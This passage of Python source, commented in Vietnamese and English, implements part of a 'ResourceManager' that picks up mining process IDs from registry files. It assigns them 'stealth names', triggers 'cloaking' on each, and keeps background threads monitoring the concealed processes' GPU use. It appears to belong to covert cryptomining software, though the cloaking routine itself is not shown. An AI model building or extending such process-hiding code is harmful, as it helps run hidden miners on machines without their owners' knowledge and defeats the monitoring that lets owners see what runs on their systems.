                        if expires_at is not None and time.time() > expires_at:
                            self.logger.debug(f"⏩ [FILE-SCANNER] Skipping expired PID file {pid_file.name}")
                            try:
                                pid_file.unlink()
                            except FileNotFoundError:
                                pass
                            continue
                        
                        self.logger.info(f"📄 [FILE-SCANNER] Processing PID file: {pid_file.name}, PID={pid}")
                        self.logger.debug(f"🔍 [FILE-SCANNER] Metadata keys: {list(metadata.keys())}")
                        
                        # Tạo MiningProcess object
                        process_name = metadata.get('stealth_name', metadata.get('process_name', f'process_{pid}'))
                        cmd = metadata.get('cmd', [])
                        
                        mining_process = MiningProcess(
                            pid=pid,
                            name=process_name,
                            cmd=cmd
                        )
                        
                        # Thêm metadata để tracking
                        enhanced_metadata = {
                            **metadata,
                            'file_scanner_timestamp': time.time(),
                            'file_path': str(pid_file),
                            'original_timestamp': timestamp,
                            'cross_process_file': True,
                            'source': 'file_scanner'
                        }
                        
                        # Gọi receive_from_registry để xử lý PID
                        self.logger.info(f"🚀 [FILE-SCANNER] Forwarding PID {pid} to registry handler")
                        # Khử trùng lặp nhận từ file: nếu đã xử lý, bỏ qua forward
                        if pid not in self._processed_pids:
                            self.receive_from_registry(pid, enhanced_metadata)
                        else:
                            self.logger.debug(f"⏩ [FILE-SCANNER] Skip duplicate receive_from_registry for PID {pid}")
                        
                        # Trigger cloaking nếu cần (tạo MiningProcess đã có ở trên)
                        if metadata.get('cloaking_required', True):
                            # Khử trùng lặp: tránh trigger nhiều lần cùng PID
                            if pid not in self._processed_pids:
                                self.logger.info(f"🛡️ [FILE-SCANNER] Triggering cloaking for PID {pid}")
                                self.trigger_cloaking(mining_process, 'file_scanner')
                                self._processed_pids.add(pid)
                            else:
                                self.logger.debug(f"⏩ [FILE-SCANNER] Skip duplicate cloaking for PID {pid}")
                        
                        # Xóa file sau khi xử lý thành công
                        pid_file.unlink()
                        self.logger.info(f"✅ [FILE-SCANNER] Successfully processed and removed: {pid_file.name}")
                        
                    except json.JSONDecodeError as je:
                        self.logger.error(f"❌ [FILE-SCANNER] JSON decode error for {pid_file.name}: {je}")
                        # Xóa file lỗi để tránh xử lý lại
                        try:
                            pid_file.unlink()
                        except:
                            pass
                    except Exception as e:
                        self.logger.error(f"❌ [FILE-SCANNER] Error processing {pid_file.name}: {e}")
                        # Không xóa file nếu có lỗi khác, có thể retry
                        
            except Exception as e:
                self.logger.error(f"❌ [FILE-SCANNER] Scanner error: {e}")
            
            # Sleep 500ms trước khi scan tiếp
            time.sleep(0.5)
        
        self.logger.info("🛑 [FILE-SCANNER] PID file scanner stopped")

    def _cleanup_old_pid_files(self):
        """
        **Cleanup Old PID Files** (dọn dẹp file PID cũ)
        
        Remove PID files older than 1 hour to prevent accumulation.
        This is a maintenance task to keep the directory clean.
        """
        from pathlib import Path
        
        pid_registry_dir = Path(os.getenv('LOGS_DIR', '/app/mining_environment/logs')) / 'ncs_pid_registry'
        current_time = time.time()
        cleaned_count = 0
        
        try:
            for pid_file in pid_registry_dir.glob('pid_*.json'):
                try:
                    file_age = current_time - pid_file.stat().st_mtime
                    if file_age > 3600:  # 1 giờ
                        pid_file.unlink()
                        cleaned_count += 1
                        self.logger.debug(f"🧹 [FILE-SCANNER] Cleaned old file: {pid_file.name} (age: {file_age:.0f}s)")
                except Exception as e:
                    self.logger.debug(f"⚠️ [FILE-SCANNER] Cleanup error for {pid_file.name}: {e}")
            
            if cleaned_count > 0:
                self.logger.info(f"🧹 [FILE-SCANNER] Cleaned {cleaned_count} old PID files")
                
        except Exception as e:
            self.logger.debug(f"⚠️ [FILE-SCANNER] Cleanup task error: {e}")
 
    def _start_workers(self):
        """**Start Worker Threads** (khởi động worker threads)"""

        # **🥇 SOLUTION 1: Add Persistent Monitoring Thread** (thêm thread giám sát liên tục)
        monitoring_worker = threading.Thread(
            target=self._persistent_monitoring_loop,
            name="ResourceManagerMonitoring",
            daemon=True
        )
        monitoring_worker.start()
        self.workers.append(monitoring_worker)
        
        # **🥇 SOLUTION 1: Add PID Processing Thread** (thêm thread xử lý PID)
        pid_worker = threading.Thread(
            target=self._pid_processing_loop,
            name="PIDProcessingWorker",
            daemon=True
        )
        pid_worker.start()
        self.workers.append(pid_worker)
        
        # File-based PID scanner deprecated and fully removed in Phase 4
        
        self.logger.info(f"Worker threads đã khởi động: {len(self.workers)} threads active")

    def shutdown(self):
        """**Shutdown ResourceManager** (tắt ResourceManager)"""
        self.logger.info("Tắt ResourceManager...")
        
        # **Clear Ready Signal** (xóa tín hiệu sẵn sàng)
        self.clear_ready_signal()

        # **Wait for Queue** (chờ queue)
        try:
            self.resource_adjustment_queue.join()
        except Exception as e:
            self.logger.error(f"Lỗi chờ queue: {e}")

        # **Set Stop Flag** (đặt cờ dừng)
        self._stop_flag = True

        # **Wait for Workers** (chờ workers)
        for worker in self.workers:
            try:
                worker.join(timeout=5.0)
                if worker.is_alive():
                    self.logger.warning(f"Worker {worker.name} vẫn đang chạy")
            except Exception as e:
                self.logger.error(f"Lỗi join worker {worker.name}: {e}")

        # ❌ IPC Bridge removed: nothing to shutdown
        
        # **Shutdown NVML** (tắt NVML – đóng thư viện NVIDIA)
        if self.shared_resource_manager:
            try:
                self.shared_resource_manager.shutdown_nvml()
            except Exception as e:
                self.logger.error(f"**NVML shutdown error** (lỗi tắt NVML – thất bại đóng thư viện): {e}")

        self.logger.info("**ResourceManager shutdown complete** (ResourceManager đã tắt – trình quản lý tài nguyên đã đóng)")

    def receive_from_registry(self, pid: int, registry_metadata: Dict[str, Any]) -> bool:
        """
        **TIER 2 FIX: Enhanced Receive PID from DirectPIDRegistry** (sửa lỗi cấp 2: nhận PID từ DirectPIDRegistry nâng cao – cải tiến nhận mã tiến trình từ sổ đăng ký)
        
        **Critical Interface Method** (phương thức giao diện quan trọng – hàm interface then chốt) cho **DirectPIDRegistry → ResourceManager handoff** (chuyển giao từ sổ đăng ký sang trình quản lý – bàn giao PID).
        
        Args:
            pid: Process ID to apply cloaking
            registry_metadata: Metadata from DirectPIDRegistry
            
        Returns:
            bool: True if cloaking successfully triggered
        """
        try:
            self.logger.info(f"🎯 [TIER-2] receive_from_registry called for PID {pid}")
            self.logger.info(f"🔍 [TIER-2] Registry metadata keys: {list(registry_metadata.keys())}")
            
            # **🥇 CRITICAL FIX: SharedResourceManager should be available từ __init__** (SharedResourceManager nên có sẵn từ __init__)
            if not self.shared_resource_manager:
                self.logger.error(f"❌ [CRITICAL] SharedResourceManager is None trong receive_from_registry cho PID {pid} - this should not happen with __init__ initialization!")
                return False
            else:
                self.logger.info(f"✅ [CRITICAL] SharedResourceManager is available in receive_from_registry")
            
            # **TIER 2 FIX: Enhanced MiningProcess creation** (tạo đối tượng MiningProcess nâng cao)
            try:
                self.logger.info(f"🔧 [TIER-2] Creating MiningProcess object for PID {pid}")
                mining_process = MiningProcess(
                    pid=pid,
                    name=registry_metadata.get('name', f'process_{pid}'),
                    cmd=registry_metadata.get('cmd', [])
                )
                self.logger.info(f"✅ [TIER-2] MiningProcess created: {mining_process.name}")
            except Exception as mp_err:
                self.logger.error(f"❌ [TIER-2] MiningProcess creation failed for PID {pid}: {mp_err}")
                # Fallback: minimal MiningProcess with best-effort fields
                try:
                    mining_process = MiningProcess(pid=pid, name=f'process_{pid}', cmd=[])
                    self.logger.warning(f"⚠️ [TIER-2] Using fallback MiningProcess for PID {pid}")
                except Exception as mp_fatal:
                    self.logger.error(f"❌ [TIER-2] FATAL: Cannot create MiningProcess for PID {pid}: {mp_fatal}")
                    return False
            
            # **TIER 2 FIX: Enhanced PID queue processing** (xử lý queue PID nâng cao)
            pid_data = {
                'pid': pid,
                'mining_process': mining_process,
                'registry_metadata': registry_metadata,
                'timestamp': time.time(),
                'source': 'direct_registry_handoff',
                'tier2_enhanced': True
            }
            
            try:
                self._last_pid_enqueued_at = time.time()
                self._pid_queue.put(pid_data, block=False)
                self.logger.info(f"✅ [TIER-2] PID {pid} queued for processing successfully")
                self.logger.debug(f"🧪 [DIAG-RACE] Queue size after direct_registry put: {self._pid_queue.qsize()} (source=direct_registry_handoff)")
                return True
            except queue.Full:
                self.logger.warning(f"⚠️ [TIER-2] PID queue full, processing immediately for PID {pid}")
                # **TIER 2 FIX: Enhanced immediate processing** (xử lý ngay lập tức nâng cao)
                success = self._process_pid_immediately(pid_data)
                self.logger.info(f"📊 [TIER-2] Immediate processing result for PID {pid}: {success}")
                return success
            
        except Exception as e:
            self.logger.error(f"❌ [TIER-2] Lỗi xử lý PID {pid} trong receive_from_registry: {e}")
            self.logger.error(f"🔍 [TIER-2] Registry metadata: {registry_metadata}")
            import traceback
            self.logger.error(f"📋 [TIER-2] Full traceback: {traceback.format_exc()}")
            return False

    def _persistent_monitoring_loop(self):
        """
        **🥇 SOLUTION 1: Persistent Monitoring Loop** (vòng lặp giám sát liên tục)
        
        Continuous monitoring thread thay thế one-shot initialization.
        Monitors cloaked processes và ensures cloaking effectiveness.
        """
        self.logger.info("🔄 [PERSISTENT] ResourceManager monitoring loop started")
        
        while not self._stop_flag:
            try:
                current_time = time.time()
                
                # **Monitor cloaked processes** (giám sát processes đã cloaked)
                if current_time - self._last_monitoring_cycle >= self._monitoring_interval:
                    self._execute_monitoring_cycle(current_time)
                    self._last_monitoring_cycle = current_time
                    self._cloaking_stats['monitoring_cycles'] += 1
                
                # **Health check** (kiểm tra sức khỏe)
                if len(self._monitored_processes) > 0:
                    self.logger.debug(f"🔍 [PERSISTENT] Monitoring {len(self._monitored_processes)} processes")
                else:
                    # Cảnh báo sớm nếu không có process nào sau một thời gian kể từ lần enqueue gần nhất
                    try:
                        warn_after = float(os.getenv('RM_EMPTY_QUEUE_WARN_SEC', '10'))
                    except Exception:
                        warn_after = 10.0
                    if (current_time - self._last_pid_enqueued_at) > warn_after:
                        self.logger.debug(f"📊 [MONITOR] No processes to monitor (🧪 [DIAG-RACE] queue_size_snapshot={self._pid_queue.qsize() if hasattr(self, '_pid_queue') else -1})")
                        self.logger.warning("⚠️ [EARLY-WARN] No PIDs processed recently; verify file-fallback and scanner status")
                
                time.sleep(5.0)  # Check every 5 seconds
                
            except Exception as e:
                self.logger.error(f"❌ [PERSISTENT] Monitoring loop error: {e}")
                time.sleep(10.0)  # Wait longer on error
        
        self.logger.info("🔚 [PERSISTENT] ResourceManager monitoring loop stopped")
    
    def _pid_processing_loop(self):
        """
        **🥇 SOLUTION 1: PID Processing Loop** (vòng lặp xử lý PID)
        
        Continuous PID processing thread.
        Processes queued PIDs từ DirectPIDRegistry và applies cloaking.
        """
        self.logger.info("🔄 [PID-PROC] PID processing loop started")
        
        while not self._stop_flag:
            try:
                # **Get PID from queue** (lấy PID từ queue)
                try:
                    pid_data = self._pid_queue.get(timeout=2.0)
                except queue.Empty:
                    continue
                
                # **Process PID** (xử lý PID)
                success = self._process_pid_immediately(pid_data)
                
                if success:
                    self.logger.info(f"✅ [PID-PROC] Successfully processed PID {pid_data['pid']}")
                else:
                    self.logger.error(f"❌ [PID-PROC] Failed to process PID {pid_data['pid']}")
                
                self._pid_queue.task_done()
                
            except Exception as e:
                self.logger.error(f"❌ [PID-PROC] Processing loop error: {e}")
                time.sleep(1.0)
        
        self.logger.info("🔚 [PID-PROC] PID processing loop stopped")
    
    def _process_pid_immediately(self, pid_data: Dict[str, Any]) -> bool:
        """
        **🥇 SOLUTION 1: Immediate PID Processing** (xử lý PID tức thì)
        
        Process a single PID immediately with cloaking application.
        """
        try:
            pid = pid_data['pid']
            mining_process = pid_data['mining_process']
            source = pid_data['source']
            
            pre_monitored = len(self._monitored_processes)
            pre_qsize = self._pid_queue.qsize() if hasattr(self, "_pid_queue") else -1
            self.logger.info(f"🎯 [IMMEDIATE] Processing PID {pid} from {source}")
            self.logger.debug(f"🧪 [DIAG-RACE] Before cloaking PID {pid}: monitored_count={pre_monitored}, queue_size={pre_qsize}")
            
            # **Apply cloaking** (áp dụng cloaking)
            self.trigger_cloaking(mining_process, source)
            
            # **Add to monitored processes** (thêm vào processes được giám sát)
            self._monitored_processes[pid] = mining_process
            self._cloaking_stats['processes_cloaked'] += 1
            post_monitored = len(self._monitored_processes)
            self.logger.debug(f"🧪 [DIAG-RACE] After cloaking PID {pid}: monitored_count={post_monitored} (Δ={post_monitored - pre_monitored})")
            
            self.logger.info(f"✅ [IMMEDIATE] PID {pid} cloaked and added to monitoring")
            return True
            
        except Exception as e:
            self.logger.error(f"❌ [IMMEDIATE] Failed to process PID {pid_data.get('pid', 'unknown')}: {e}")
            self._cloaking_stats['failed_cloakings'] += 1
            return False
    
    def _execute_monitoring_cycle(self, current_time: float):
        """
        **🥇 SOLUTION 1: Execute Monitoring Cycle** (thực thi chu kỳ giám sát)
        
        Run a complete monitoring cycle cho all tracked processes.
        """
        try:
            if not self._monitored_processes:
                qsize_snapshot = self._pid_queue.qsize() if hasattr(self, "_pid_queue") else -1
                self.logger.debug(f"📊 [MONITOR] No processes to monitor (🧪 [DIAG-RACE] queue_size_snapshot={qsize_snapshot})")
                return
            
            self.logger.info(f"📊 [MONITOR] Starting monitoring cycle for {len(self._monitored_processes)} processes")
            
            # **Check process health** (kiểm tra sức khỏe process)
            dead_pids = []
            for pid, mining_process in self._monitored_processes.items():
                try:
                    # **Verify process still exists** (kiểm tra process vẫn tồn tại)
                    import psutil
                    proc = psutil.Process(pid)
                    
                    if not proc.is_running():
                        dead_pids.append(pid)
                        self.logger.info(f"💀 [MONITOR] Process {pid} is dead, removing from monitoring")
                    else:
                        # **Collect metrics** (thu thập metrics)
                        metrics = self.collect_metrics(mining_process)
                        self.logger.debug(f"📈 [MONITOR] PID {pid} metrics: GPU={metrics.get('gpu_usage', 0):.1f}%")
                        
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    dead_pids.append(pid)
                    self.logger.info(f"💀 [MONITOR] Process {pid} no longer accessible, removing")
                except Exception as e:
                    self.logger.warning(f"⚠️ [MONITOR] Error checking PID {pid}: {e}")
            
            # **Clean up dead processes** (dọn dẹp processes đã chết)
            for pid in dead_pids:
                del self._monitored_processes[pid]
            
            # **Log monitoring stats** (ghi log thống kê giám sát)
            self.logger.info(f"📊 [MONITOR] Cycle complete: {len(self._monitored_processes)} active, {len(dead_pids)} removed")
            self.logger.info(f"📊 [STATS] Cloaked: {self._cloaking_stats['processes_cloaked']}, "
                           f"Failed: {self._cloaking_stats['failed_cloakings']}, "
                           f"Cycles: {self._cloaking_stats['monitoring_cycles']}")
            
        except Exception as e:
            self.logger.error(f"❌ [MONITOR] Monitoring cycle failed: {e}")

    def stop(self):
        """**Stop ResourceManager** (dừng ResourceManager) - Interface implementation"""
        self.shutdown()